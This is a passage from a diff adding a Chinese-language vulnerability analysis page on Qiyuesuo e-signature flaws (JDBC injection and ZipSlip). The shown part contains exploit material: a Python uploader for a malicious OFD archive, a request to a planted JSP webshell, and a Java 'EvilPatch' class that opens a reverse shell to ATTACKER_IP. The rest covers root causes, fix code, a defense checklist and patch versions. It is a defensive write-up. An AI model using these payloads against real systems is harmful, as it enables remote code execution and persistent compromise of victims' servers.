+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[*] 尝试上传到: </span><span class="si">{</span><span class="n">url</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+        <span class="n">files</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;file&#39;</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;test.ofd&#39;</span><span class="p">,</span> <span class="n">file_data</span><span class="p">,</span> <span class="s1">&#39;application/octet-stream&#39;</span><span class="p">)}</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="n">files</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">15</span><span class="p">)</span>
+            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;    状态码: </span><span class="si">{</span><span class="n">resp</span><span class="o">.</span><span class="n">status_code</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;    响应: </span><span class="si">{</span><span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">[:</span><span class="mi">200</span><span class="p">]</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+            <span class="c1"># 即使返回验证失败，文件可能已被写入</span>
+            <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[*] 注意: 即使返回验证失败，ZipSlip文件可能已写入磁盘&quot;</span><span class="p">)</span>
+        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;    错误: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
+    <span class="n">target</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span> <span class="k">else</span> <span class="s2">&quot;http://target.example.com&quot;</span>
+    <span class="n">ofd_file</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">2</span> <span class="k">else</span> <span class="s2">&quot;evil_ofd_webshell.ofd&quot;</span>
+    <span class="n">upload_malicious_ofd</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">ofd_file</span><span class="p">)</span>
+</code></pre></div>
+
+<p><strong>步骤3：访问写入的Webshell（若使用JSP路径）</strong></p>
+<div class="highlight"><pre><span></span><code><span class="nf">GET</span> <span class="nn">/shell.jsp?cmd=id</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="o">:</span> <span class="l">target.example.com</span>
+</code></pre></div>
+
+<h3>7.3 恶意补丁JAR构造（用于热加载RCE路径）</h3>
+<p>若目标通过热加载机制实现RCE，需构造一个包含恶意Spring Bean的JAR：</p>
+<div class="highlight"><pre><span></span><code><span class="c1">// EvilPatch.java — 打包进恶意补丁JAR</span>
+<span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">EvilPatch</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="kd">static</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="c1">// 类加载时执行的静态代码块</span>
+<span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">cmd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="s">&quot;/bin/bash&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;-c&quot;</span><span class="p">,</span>
+<span class="w">                </span><span class="s">&quot;bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/4444 0&gt;&amp;1&quot;</span><span class="p">};</span>
+<span class="w">            </span><span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">().</span><span class="na">exec</span><span class="p">(</span><span class="n">cmd</span><span class="p">);</span>
+<span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="n">e</span><span class="p">.</span><span class="na">printStackTrace</span><span class="p">();</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<div class="highlight"><pre><span></span><code><span class="c1"># 编译并打包</span>
+javac<span class="w"> </span>EvilPatch.java
+jar<span class="w"> </span>cvf<span class="w"> </span>malicious.jar<span class="w"> </span>EvilPatch.class
+
+<span class="c1"># 然后用ZipSlip将malicious.jar写入补丁热加载目录</span>
+python3<span class="w"> </span>craft_zipslip_ofd.py
+<span class="c1"># 穿越目标设为 ../../patch/malicious.jar</span>
+</code></pre></div>
+
+<p>当PatchManager加载该JAR并初始化类时，<code>static</code> 代码块自动执行，实现RCE。</p>
+<hr />
+<h2>8. 根因总结与攻击面对比</h2>
+<h3>8.1 两个漏洞的根因对比</h3>
+<table>
+<thead>
+<tr>
+<th>维度</th>
+<th>QVD-2025-23408 (JDBC注入)</th>
+<th>QVD-2025-27432 (ZipSlip)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>漏洞类型</strong></td>
+<td>注入（CWE-89变体/CWE-74）</td>
+<td>路径穿越（CWE-22）</td>
+</tr>
+<tr>
+<td><strong>根因</strong></td>
+<td>JDBC连接参数未过滤直接拼接</td>
+<td>ZIP解压未校验条目路径</td>
+</tr>
+<tr>
+<td><strong>入口接口</strong></td>
+<td>/setup/dbtest（未授权）</td>
+<td>PDFVerifier验证接口</td>
+</tr>
+<tr>
+<td><strong>认证要求</strong></td>
+<td>无需认证（permitAll配置缺陷）</td>
+<td>无需认证（验证接口公开）</td>
+</tr>
+<tr>
+<td><strong>RCE达成方式</strong></td>
+<td>Spring ClassPathXmlApplicationContext加载恶意XML</td>
+<td>覆盖补丁文件触发热加载 / 写入Webshell</td>
+</tr>
+<tr>
+<td><strong>设计缺陷</strong></td>
+<td>初始化接口在生产环境仍可访问</td>
+<td>验证逻辑先解压后检查</td>
+</tr>
+<tr>
+<td><strong>修复方式</strong></td>
+<td>接口鉴权 + 参数白名单 + 补丁升级</td>
+<td>路径规范化校验 + 补丁签名验证</td>
+</tr>
+</tbody>
+</table>
+<h3>8.2 共同的安全设计缺陷</h3>
+<p>两个漏洞虽然技术细节不同，但反映出共同的安全设计问题：</p>
+<ol>
+<li>
+<p><strong>初始化接口长期暴露</strong>：setup类接口在系统初始化完成后应被禁用或加锁，但契约锁未实施这一生命周期管理。</p>
+</li>
+<li>
+<p><strong>缺乏纵深防御</strong>：单一缺陷即可导致RCE，没有在多个层级（网络层、应用层、文件系统层）设置互相独立的防护。</p>
+</li>
+<li>
+<p><strong>补丁机制自身成为攻击面</strong>：热加载补丁机制虽方便运维，但缺少签名验证，反而成为攻击者写入持久化后门的渠道。</p>
+</li>
+<li>
+<p><strong>输入信任边界模糊</strong>：无论是JDBC参数还是ZIP条目名，系统都将其视为可信输入直接使用，未在信任边界处做净化。</p>
+</li>
+</ol>
+<hr />
+<h2>9. 防御方案</h2>
+<h3>9.1 接口鉴权强化</h3>
+<div class="highlight"><pre><span></span><code><span class="c1">// 修复方案1: 初始化完成后禁用setup接口</span>
+<span class="nd">@Configuration</span>
+<span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">ConsoleConfiguration</span><span class="w"> </span><span class="kd">extends</span><span class="w"> </span><span class="n">WebSecurityConfigurerAdapter</span><span class="w"> </span><span class="p">{</span>
+
+<span class="w">    </span><span class="nd">@Autowired</span>
+<span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="n">SystemInitService</span><span class="w"> </span><span class="n">initService</span><span class="p">;</span>
+
+<span class="w">    </span><span class="nd">@Override</span>
+<span class="w">    </span><span class="kd">protected</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">configure</span><span class="p">(</span><span class="n">HttpSecurity</span><span class="w"> </span><span class="n">http</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">http</span><span class="p">.</span><span class="na">authorizeRequests</span><span class="p">()</span>
+<span class="w">            </span><span class="p">.</span><span class="na">antMatchers</span><span class="p">(</span><span class="s">&quot;/setup/**&quot;</span><span class="p">).</span><span class="na">access</span><span class="p">(</span>
+<span class="w">                </span><span class="s">&quot;@initService.isSystemUninitialized()&quot;</span><span class="w">  </span><span class="c1">// 仅未初始化时放行</span>
+<span class="w">            </span><span class="p">)</span>
+<span class="w">            </span><span class="p">.</span><span class="na">anyRequest</span><span class="p">().</span><span class="na">authenticated</span><span class="p">();</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+
+<span class="nd">@Service</span>
+<span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">SystemInitService</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">boolean</span><span class="w"> </span><span class="nf">isSystemUninitialized</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="c1">// 检查系统是否已完成初始化配置</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="o">!</span><span class="n">configRepository</span><span class="p">.</span><span class="na">isInitialized</span><span class="p">();</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<h3>9.2 JDBC参数白名单校验</h3>
+<div class="highlight"><pre><span></span><code><span class="c1">// 修复方案2: 对数据库连接参数实施严格白名单</span>
+<span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">DatabaseService</span><span class="w"> </span><span class="p">{</span>
+
+<span class="w">    </span><span class="c1">// 仅允许字母、数字、下划线作为数据库名</span>
+<span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="n">Pattern</span><span class="w"> </span><span class="n">DB_NAME_PATTERN</span><span class="w"> </span><span class="o">=</span>
+<span class="w">        </span><span class="n">Pattern</span><span class="p">.</span><span class="na">compile</span><span class="p">(</span><span class="s">&quot;^[a-zA-Z0-9_]{1,64}$&quot;</span><span class="p">);</span>
+
+<span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">Connection</span><span class="w"> </span><span class="nf">getConnection</span><span class="p">(</span><span class="n">DatabaseConfig</span><span class="w"> </span><span class="n">config</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="c1">// 白名单校验</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">DB_NAME_PATTERN</span><span class="p">.</span><span class="na">matcher</span><span class="p">(</span><span class="n">config</span><span class="p">.</span><span class="na">getName</span><span class="p">()).</span><span class="na">matches</span><span class="p">())</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">SecurityException</span><span class="p">(</span><span class="s">&quot;非法的数据库名: &quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">config</span><span class="p">.</span><span class="na">getName</span><span class="p">());</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">        </span><span class="c1">// 校验host和port</span>
+<span class="w">        </span><span class="n">validateHost</span><span class="p">(</span><span class="n">config</span><span class="p">.</span><span class="na">getHost</span><span class="p">());</span>
+<span class="w">        </span><span class="n">validatePort</span><span class="p">(</span><span class="n">config</span><span class="p">.</span><span class="na">getPort</span><span class="p">());</span>
+
+<span class="w">        </span><span class="c1">// 使用参数化方式构建连接，禁止拼接</span>
+<span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">url</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">String</span><span class="p">.</span><span class="na">format</span><span class="p">(</span><span class="s">&quot;jdbc:postgresql://%s:%d/%s&quot;</span><span class="p">,</span>
+<span class="w">            </span><span class="n">config</span><span class="p">.</span><span class="na">getHost</span><span class="p">(),</span>
+<span class="w">            </span><span class="n">Integer</span><span class="p">.</span><span class="na">parseInt</span><span class="p">(</span><span class="n">config</span><span class="p">.</span><span class="na">getPort</span><span class="p">()),</span>
+<span class="w">            </span><span class="n">config</span><span class="p">.</span><span class="na">getName</span><span class="p">());</span>
+<span class="w">        </span><span class="c1">// 不允许传入任何额外JDBC参数</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">DriverManager</span><span class="p">.</span><span class="na">getConnection</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="w"> </span><span class="n">config</span><span class="p">.</span><span class="na">getUsername</span><span class="p">(),</span>
+<span class="w">                                           </span><span class="n">config</span><span class="p">.</span><span class="na">getPassword</span><span class="p">());</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<h3>9.3 ZipSlip防护：路径规范化校验</h3>
+<div class="highlight"><pre><span></span><code><span class="c1">// 修复方案3: 解压前校验每个条目的路径</span>
+<span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">SafeUnzip</span><span class="w"> </span><span class="p">{</span>
+
+<span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">unzipSafely</span><span class="p">(</span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">fileBytes</span><span class="p">,</span><span class="w"> </span><span class="n">Path</span><span class="w"> </span><span class="n">destDir</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">Path</span><span class="w"> </span><span class="n">canonicalDest</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">destDir</span><span class="p">.</span><span class="na">toAbsolutePath</span><span class="p">().</span><span class="na">normalize</span><span class="p">();</span>
+
+<span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">(</span><span class="n">ZipInputStream</span><span class="w"> </span><span class="n">zis</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ZipInputStream</span><span class="p">(</span>
+<span class="w">                </span><span class="k">new</span><span class="w"> </span><span class="n">ByteArrayInputStream</span><span class="p">(</span><span class="n">fileBytes</span><span class="p">)))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="n">ZipEntry</span><span class="w"> </span><span class="n">entry</span><span class="p">;</span>
+<span class="w">            </span><span class="k">while</span><span class="w"> </span><span class="p">((</span><span class="n">entry</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">zis</span><span class="p">.</span><span class="na">getNextEntry</span><span class="p">())</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                </span><span class="n">Path</span><span class="w"> </span><span class="n">outputPath</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">canonicalDest</span><span class="p">.</span><span class="na">resolve</span><span class="p">(</span><span class="n">entry</span><span class="p">.</span><span class="na">getName</span><span class="p">())</span>
+<span class="w">                                              </span><span class="p">.</span><span class="na">normalize</span><span class="p">();</span>
+
+<span class="w">                </span><span class="c1">// 关键校验: 解析后的路径必须仍在目标目录内</span>
+<span class="w">                </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">outputPath</span><span class="p">.</span><span class="na">startsWith</span><span class="p">(</span><span class="n">canonicalDest</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                    </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">SecurityException</span><span class="p">(</span>
+<span class="w">                        </span><span class="s">&quot;检测到ZipSlip路径穿越: &quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">entry</span><span class="p">.</span><span class="na">getName</span><span class="p">());</span>
+<span class="w">                </span><span class="p">}</span>
+
+<span class="w">                </span><span class="c1">// 额外检查: 禁止绝对路径和盘符(Windows)</span>
+<span class="w">                </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">entry</span><span class="p">.</span><span class="na">getName</span><span class="p">().</span><span class="na">contains</span><span class="p">(</span><span class="s">&quot;..&quot;</span><span class="p">)</span><span class="w"> </span><span class="o">||</span>
+<span class="w">                    </span><span class="n">entry</span><span class="p">.</span><span class="na">getName</span><span class="p">().</span><span class="na">startsWith</span><span class="p">(</span><span class="s">&quot;/&quot;</span><span class="p">)</span><span class="w"> </span><span class="o">||</span>
+<span class="w">                    </span><span class="n">entry</span><span class="p">.</span><span class="na">getName</span><span class="p">().</span><span class="na">matches</span><span class="p">(</span><span class="s">&quot;^[A-Za-z]:.*&quot;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                    </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">SecurityException</span><span class="p">(</span>
+<span class="w">                        </span><span class="s">&quot;非法的压缩条目路径: &quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">entry</span><span class="p">.</span><span class="na">getName</span><span class="p">());</span>
+<span class="w">                </span><span class="p">}</span>
+
+<span class="w">                </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">entry</span><span class="p">.</span><span class="na">isDirectory</span><span class="p">())</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                    </span><span class="n">Files</span><span class="p">.</span><span class="na">createDirectories</span><span class="p">(</span><span class="n">outputPath</span><span class="p">);</span>
+<span class="w">                </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                    </span><span class="n">Files</span><span class="p">.</span><span class="na">copy</span><span class="p">(</span><span class="n">zis</span><span class="p">,</span><span class="w"> </span><span class="n">outputPath</span><span class="p">,</span>
+<span class="w">                        </span><span class="n">StandardCopyOption</span><span class="p">.</span><span class="na">REPLACE_EXISTING</span><span class="p">);</span>
+<span class="w">                </span><span class="p">}</span>
+<span class="w">            </span><span class="p">}</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<h3>9.4 补丁签名验证</h3>
+<div class="highlight"><pre><span></span><code><span class="c1">// 修复方案4: 热加载补丁必须通过签名验证</span>
+<span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">PatchManager</span><span class="w"> </span><span class="p">{</span>
+
+<span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">loadPatch</span><span class="p">(</span><span class="n">Path</span><span class="w"> </span><span class="n">patchFile</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="c1">// 1. 验证数字签名</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">verifySignature</span><span class="p">(</span><span class="n">patchFile</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">SecurityException</span><span class="p">(</span><span class="s">&quot;补丁签名验证失败，拒绝加载: &quot;</span>
+<span class="w">                </span><span class="o">+</span><span class="w"> </span><span class="n">patchFile</span><span class="p">);</span>
+<span class="w">        </span><span class="p">}</span>
+
+<span class="w">        </span><span class="c1">// 2. 验证补丁来源</span>
+<span class="w">        </span><span class="n">PatchManifest</span><span class="w"> </span><span class="n">manifest</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">readManifest</span><span class="p">(</span><span class="n">patchFile</span><span class="p">);</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">isTrustedPublisher</span><span class="p">(</span><span class="n">manifest</span><span class="p">.</span><span class="na">getPublisher</span><span class="p">()))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">SecurityException</span><span class="p">(</span><span class="s">&quot;不可信的补丁发布者&quot;</span><span class="p">);</span>
+<span class="w">        </span><span class="p">}</span>
+
+<span class="w">        </span><span class="c1">// 3. 验证补丁完整性 (哈希校验)</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">verifyIntegrity</span><span class="p">(</span><span class="n">patchFile</span><span class="p">,</span><span class="w"> </span><span class="n">manifest</span><span class="p">.</span><span class="na">getExpectedHash</span><span class="p">()))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">SecurityException</span><span class="p">(</span><span class="s">&quot;补丁完整性校验失败&quot;</span><span class="p">);</span>
+<span class="w">        </span><span class="p">}</span>
+
+<span class="w">        </span><span class="c1">// 4. 验证通过后才加载</span>
+<span class="w">        </span><span class="n">ClassLoader</span><span class="w"> </span><span class="n">loader</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">URLClassLoader</span><span class="p">(</span>
+<span class="w">            </span><span class="k">new</span><span class="w"> </span><span class="n">URL</span><span class="o">[]</span><span class="p">{</span><span class="n">patchFile</span><span class="p">.</span><span class="na">toUri</span><span class="p">().</span><span class="na">toURL</span><span class="p">()});</span>
+<span class="w">        </span><span class="c1">// ... 加载逻辑</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kt">boolean</span><span class="w"> </span><span class="nf">verifySignature</span><span class="p">(</span><span class="n">Path</span><span class="w"> </span><span class="n">file</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="c1">// 使用厂商私钥签名，公钥验证</span>
+<span class="w">        </span><span class="c1">// 使用JAR签名机制 (jarsigner) 或自定义RSA签名</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">JarSignerUtil</span><span class="p">.</span><span class="na">verify</span><span class="p">(</span><span class="n">file</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<h3>9.5 纵深防御清单</h3>
+<div class="highlight"><pre><span></span><code>┌─────────────────────────────────────────────────────────────┐
+│                    纵深防御架构                               │
+├─────────────────────────────────────────────────────────────┤
+│  网络层:                                                     │
+│    □ 管理控制台不暴露在公网，仅内网/VPN可访问                  │
+│    □ WAF规则拦截setup/dbtest等敏感路径的外部访问              │
+│    □ 出站流量限制 (阻止服务器主动连接外部加载XML)             │
+├─────────────────────────────────────────────────────────────┤
+│  应用层:                                                     │
+│    □ 初始化接口生命周期管理 (初始化后禁用)                    │
+│    □ 所有数据库参数白名单校验                                 │
+│    □ 所有文件上传/解压路径穿越校验                            │
+│    □ 补丁热加载强制签名验证                                   │
+├─────────────────────────────────────────────────────────────┤
+│  运行时:                                                     │
+│    □ JVM Security Manager / 模块化限制 (限制类加载)          │
+│    □ 文件系统权限最小化 (应用进程仅能写指定目录)              │
+│    □ 出站连接白名单 (JDBC仅允许连接指定数据库地址)            │
+├─────────────────────────────────────────────────────────────┤
+│  监控层:                                                     │
+│    □ setup接口访问告警 (生产环境访问即告警)                   │
+│    □ 补丁目录文件变化监控与告警                               │
+│    □ 异常出站连接检测 (ClassPathXmlApplicationContext加载)   │
+└─────────────────────────────────────────────────────────────┘
+</code></pre></div>
+
+<h3>9.6 补丁升级</h3>
+<p>官方已发布安全补丁，受影响用户应尽快升级：
+- 补丁下载地址：https://www.qiyuesuo.com/more/security/servicepack
+- QVD-2025-23408：升级补丁至 1.3.5（4.0.*~4.3.7）或 2.1.5（4.3.8~5.3.*）以上
+- QVD-2025-27432：升级补丁至 1.3.8（4.0.x~4.3.7）或 2.1.8（4.3.8~5.3.x）以上</p>
+<hr />
+<h2>免责声明</h2>
+<p>本文仅供安全研究和技术学习使用，文中涉及的漏洞分析、PoC代码和攻击技术仅用于授权测试和安全防御建设。读者应遵守所在地区的法律法规，未经授权不得对任何系统进行渗透测试或攻击。因不当使用本文内容所造成的任何后果，作者不承担任何责任。</p>
+<div class="back"><a href="../">← Back to Home</a></div>
+</article>
+</main>
+<footer>Powered by GitHub Pages 2026</footer>
+</body>
+</html>
